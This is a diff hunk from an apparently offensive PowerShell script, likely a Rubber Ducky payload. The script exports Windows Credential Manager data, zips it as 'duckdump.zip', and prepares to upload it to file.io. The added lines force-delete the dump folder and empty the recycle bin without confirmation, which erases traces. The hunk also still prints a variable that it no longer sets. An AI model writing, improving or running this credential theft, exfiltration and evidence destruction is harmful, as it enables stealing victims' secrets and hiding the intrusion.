@@ -114,13 +114,22 @@ Write-Host "Credential manager information exported to $outputFilePath"
 
 #############################################
 
-$sourceFolderPath = $folderPath
 $zipFilePath = Join-Path $folderPath "duckdump.zip"
-Compress-Archive -Path $sourceFolderPath -DestinationPath $zipFilePath
+Compress-Archive -Path $folderPath -DestinationPath $zipFilePath
 
 Write-Host "Dump compressed to $sourceFolderPath"
 
 #############################################
+
+# Delete the folder
+Remove-Item -Path $folderPath -Recurse -Force
+
+# Empty the recycle bin
+Clear-RecycleBin -Confirm:$false
+
+Write-Host "Dump folder deleted and recycle bin emptied."
+
+############################################
 
 # API endpoint for file.io
 $uploadUrl = "https://file.io"
